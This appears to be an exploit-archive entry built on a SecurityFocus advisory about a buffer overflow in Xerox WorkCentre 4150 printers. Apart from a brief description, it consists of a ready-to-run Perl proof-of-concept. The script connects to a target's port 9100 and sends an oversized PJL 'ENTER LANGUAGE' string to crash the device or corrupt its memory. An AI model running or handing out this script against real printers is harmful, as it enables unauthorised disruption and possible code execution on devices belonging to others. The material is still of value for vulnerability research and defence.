source: http://www.securityfocus.com/bid/38010/info

Xerox WorkCentre is prone to a buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.

Attackers can exploit this issue to execute arbitrary code with the privileges of the application or crash the affected application.

Xerox WorkCentre 4150 is vulnerable; other versions may also be affected. 

#!/usr/bin/perl -w


use IO::Socket;
if (@ARGV < 1){
exit
}
$ip = $ARGV[0];
#open the socket
my $sock = new IO::Socket::INET (
PeerAddr => $ip,
PeerPort => '9100',
Proto => 'tcp',
);


$sock or die "no socket :$!";
send($sock, "\033%-12345X\@PJL ENTER LANGUAGE = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",0);



close $sock;